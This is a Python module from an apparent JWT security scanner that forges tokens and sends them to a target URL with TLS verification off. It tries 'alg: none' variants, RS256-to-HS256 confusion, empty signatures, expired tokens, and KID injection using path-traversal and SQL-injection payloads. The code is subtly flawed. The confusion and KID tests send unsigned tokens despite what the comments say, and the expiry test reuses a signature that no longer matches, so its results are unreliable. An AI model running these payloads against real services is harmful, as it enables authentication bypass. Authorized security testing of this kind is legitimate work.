"""JWT security tester — pure Python base64 manipulation.

Tests algorithm none bypass, algorithm confusion, empty signature,
expiry enforcement, and KID injection. No external tools required.
"""

from __future__ import annotations

import base64
import json
import time
from typing import Any

import aiohttp
import structlog

logger = structlog.get_logger()

_TIMEOUT = aiohttp.ClientTimeout(total=15)
_HEADERS = {"User-Agent": "Mozilla/5.0 (BugHound Scanner)"}


# ---------------------------------------------------------------------------
# JWT helpers
# ---------------------------------------------------------------------------


def _b64url_decode(data: str) -> bytes:
    """Base64url decode without padding."""
    padding = 4 - len(data) % 4
    if padding != 4:
        data += "=" * padding
    return base64.urlsafe_b64decode(data)


def _b64url_encode(data: bytes) -> str:
    """Base64url encode without padding."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _decode_jwt(token: str) -> tuple[dict, dict, str]:
    """Decode a JWT into (header, payload, signature). Never raises."""
    parts = token.split(".")
    if len(parts) != 3:
        return {}, {}, ""
    try:
        header = json.loads(_b64url_decode(parts[0]))
    except Exception:
        header = {}
    try:
        payload = json.loads(_b64url_decode(parts[1]))
    except Exception:
        payload = {}
    return header, payload, parts[2]


def _build_jwt(header: dict, payload: dict, signature: str = "") -> str:
    """Build a JWT from parts."""
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}.{signature}"


async def _send_with_token(
    session: aiohttp.ClientSession,
    url: str,
    token: str,
    original_token: str,
) -> tuple[int, str]:
    """Send request with JWT in Authorization header."""
    headers = {
        **_HEADERS,
        "Authorization": f"Bearer {token}",
    }
    try:
        async with session.get(
            url, headers=headers, ssl=False, timeout=_TIMEOUT,
        ) as resp:
            body = await resp.text(errors="replace")
            return resp.status, body[:5000]
    except Exception:
        return 0, ""


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------


async def test_jwt(token: str, target_url: str) -> dict[str, Any]:
    """Run JWT security tests against a target URL.

    token: the JWT to test.
    target_url: endpoint that requires the JWT.

    Returns dict with test results for each attack vector.
    """
    header, payload, signature = _decode_jwt(token)

    if not header:
        return {
            "error": "Invalid JWT format",
            "token_claims": {},
            "alg_none_bypass": False,
            "alg_confusion": False,
            "empty_signature": False,
            "expiry_enforced": True,
            "kid_injectable": False,
        }

    results: dict[str, Any] = {
        "token_claims": payload,
        "token_header": header,
        "original_alg": header.get("alg", "unknown"),
        "alg_none_bypass": False,
        "alg_confusion": False,
        "empty_signature": False,
        "expiry_enforced": True,
        "kid_injectable": False,
    }

    async with aiohttp.ClientSession() as session:
        # Get baseline — original token should work
        baseline_status, _ = await _send_with_token(
            session, target_url, token, token,
        )

        # If original token doesn't work, we can't test
        if baseline_status in (0, 401, 403):
            results["note"] = "Original token not accepted; tests may be unreliable"

        # Test 1: Algorithm None
        for none_alg in ["none", "None", "NONE", "nOnE"]:
            none_header = {**header, "alg": none_alg}
            none_token = _build_jwt(none_header, payload, "")
            status, _ = await _send_with_token(
                session, target_url, none_token, token,
            )
            if status == 200:
                results["alg_none_bypass"] = True
                results["alg_none_variant"] = none_alg
                break

        # Test 2: Algorithm Confusion (RS256 -> HS256)
        orig_alg = header.get("alg", "").upper()
        if orig_alg.startswith("RS"):
            confusion_header = {**header, "alg": "HS256"}
            # Sign with empty secret (common misconfiguration)
            confusion_token = _build_jwt(confusion_header, payload, "")
            status, _ = await _send_with_token(
                session, target_url, confusion_token, token,
            )
            if status == 200:
                results["alg_confusion"] = True

        # Test 3: Empty Signature
        parts = token.split(".")
        empty_sig_token = f"{parts[0]}.{parts[1]}."
        status, _ = await _send_with_token(
            session, target_url, empty_sig_token, token,
        )
        if status == 200:
            results["empty_signature"] = True

        # Test 4: Expired Token
        exp = payload.get("exp")
        if exp and isinstance(exp, (int, float)):
            now = time.time()
            if exp < now:
                # Token is already expired — test if it's still accepted
                status, _ = await _send_with_token(
                    session, target_url, token, token,
                )
                if status == 200:
                    results["expiry_enforced"] = False
            else:
                # Token not expired — modify exp to past
                expired_payload = {**payload, "exp": int(now) - 3600}
                expired_token = _build_jwt(header, expired_payload, signature)
                status, _ = await _send_with_token(
                    session, target_url, expired_token, token,
                )
                if status == 200:
                    results["expiry_enforced"] = False

        # Test 5: KID Injection
        if "kid" in header:
            for kid_payload in [
                "../../../../../../etc/passwd",
                "' UNION SELECT 'secret'--",
                "/dev/null",
            ]:
                kid_header = {**header, "kid": kid_payload}
                kid_token = _build_jwt(kid_header, payload, "")
                status, _ = await _send_with_token(
                    session, target_url, kid_token, token,
                )
                if status == 200:
                    results["kid_injectable"] = True
                    results["kid_payload"] = kid_payload
                    break

    return results
